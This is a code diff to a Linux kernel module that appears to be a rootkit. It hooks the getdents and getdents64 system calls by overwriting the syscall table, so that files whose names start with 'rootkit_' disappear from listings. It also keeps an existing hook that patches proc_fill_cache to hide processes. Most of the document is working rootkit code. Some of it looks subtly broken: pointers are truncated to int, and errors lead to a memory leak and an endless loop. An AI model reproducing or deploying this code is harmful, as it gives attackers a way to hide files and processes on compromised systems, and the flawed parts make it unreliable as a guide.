@@ -17,16 +17,28 @@
 #include <linux/fs.h>
 #include <linux/pid_namespace.h>
 #include <linux/ptrace.h>
-
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
 #include <asm/paravirt.h>
-
 #include "sysmap.h"
 #include "proc_internal.h"
 
-/* handle at most 10 inputs once */
-int pid[10];
-int var_count = 0;
-module_param_array(pid, int, &var_count, 0000);
+struct linux_dirent {
+  unsigned long   d_ino;
+  unsigned long   d_off;
+  unsigned short  d_reclen;
+  char            d_name[1];
+};
+
+#define syscalls ((void**)SM_sys_call_table)
+
+#define FILE_HIDDEN_DISABLE 0
+#define FILE_HIDDEN_ENABLE 1
+
+atomic_t active_calls = ATOMIC_INIT(0);
+
+char *file_hiding_prefix = "rootkit_";
 
 void disable_ro(void)
 {
@@ -40,11 +52,90 @@ void enable_ro(void)
     barrier();
 }
 
-#define syscalls ((void**)SM_sys_call_table)
 
-int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);
+/* file hiding */
+asmlinkage int (*real_getdents)(unsigned int, struct linux_dirent*, unsigned int);
+asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 
-atomic_t active_read_calls = ATOMIC_INIT(0);
+int shall_hide(char *file_name)
+{
+  char *file_name_tmp = file_name;
+  char *prefix_tmp = file_hiding_prefix;
+
+  while (*prefix_tmp != '\0') {
+    if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
+      return 0;
+    }
+    ++file_name_tmp;
+    ++prefix_tmp;
+  }
+  return 1;
+}
+
+asmlinkage int fake_getdents64( unsigned int fd,
+                                struct linux_dirent64 *dirp,
+                                unsigned int count )
+{
+  int ret;
+  struct linux_dirent64 *cur = dirp;
+  int pos = 0;
+
+  ret = real_getdents64 (fd, dirp, count);
+
+  while (pos < ret) {
+
+    if (shall_hide(cur->d_name)) {
+      int err;
+      int reclen = cur->d_reclen;
+      char *next_rec = (char*)cur + reclen;
+      int len = (int)dirp + ret - (int)next_rec;
+      char *remaining_dirents = kmalloc(len, GFP_KERNEL);
+
+      // modify the memory storing the returned information
+      err = copy_from_user(remaining_dirents, next_rec, len);
+      if (err) {
+        continue;
+      }
+      err = copy_to_user(cur, remaining_dirents, len);
+      if (err) {
+        continue;
+      }
+      kfree(remaining_dirents);
+      // Adjust the return value;
+      ret -= reclen;
+      continue;
+    }
+    // Get the next dirent
+    pos += cur->d_reclen;
+    cur = (struct linux_dirent64*) ((char*)dirp + pos);
+  }
+  return ret;
+}
+
+asmlinkage int fake_getdents(  unsigned int fd,
+                               struct linux_dirent*dirp,
+                               unsigned int count )
+{
+  int ret;
+  struct linux_dirent* cur = dirp;
+  int pos = 0;
+
+  ret = real_getdents(fd, dirp, count);
+  while (pos < ret) {
+
+    if (shall_hide(cur->d_name)) {
+      int reclen = cur->d_reclen;
+      char* next_rec = (char*)cur + reclen;
+      int len = (int)dirp + ret - (int)next_rec;
+      memmove(cur, next_rec, len);
+      ret -= reclen;
+      continue;
+    }
+    pos += cur->d_reclen;
+    cur = (struct linux_dirent*) ((char*)dirp + pos);
+  }
+  return ret;
+}
 
 bool fake__proc_fill_cache( struct file *file,
                             struct dir_context *ctx,
@@ -64,7 +155,7 @@ bool fake__proc_fill_cache( struct file *file,
     struct path path;
     char* tmp, * pathname;
 
-    atomic_inc(&active_read_calls);
+    atomic_inc(&active_calls);
 
     snprintf(textbuf, sizeof(textbuf), "%d", (int)(long long)ptr);
     if ((strcmp(name, textbuf) == 0)) // && (task->tgid == 17643))
@@ -117,7 +208,7 @@ end_instantiate:
     ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);
 
 gtfo:
-    atomic_dec(&active_read_calls);
+    atomic_dec(&active_calls);
     return ret;
 }
 
@@ -135,6 +226,12 @@ void hook(void)
     *(void**)(p + 2) = fake__proc_fill_cache;
     p[10] = 0xff;
     p[11] = 0xe0;
+
+    real_getdents             = syscalls[__NR_getdents];
+    real_getdents64           = syscalls[__NR_getdents64];
+    syscalls[__NR_getdents]   = fake_getdents;
+    syscalls[__NR_getdents64] = fake_getdents64;
+
     enable_ro();
 }
 
@@ -142,6 +239,10 @@ void unhook(void)
 {
     disable_ro();
     memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));
+
+    syscalls[__NR_getdents]   = real_getdents;
+    syscalls[__NR_getdents64] = real_getdents64;
+
     enable_ro();
 }
 
@@ -159,7 +260,7 @@ void cleanup_module(void){
     unhook();
     // Prevent other CPUs from crashing due to running unloaded code
     // Not too pretty but should be fine
-    while (atomic_read(&active_read_calls) != 0)
+    while (atomic_read(&active_calls) != 0)
         msleep(100);
 
     return;
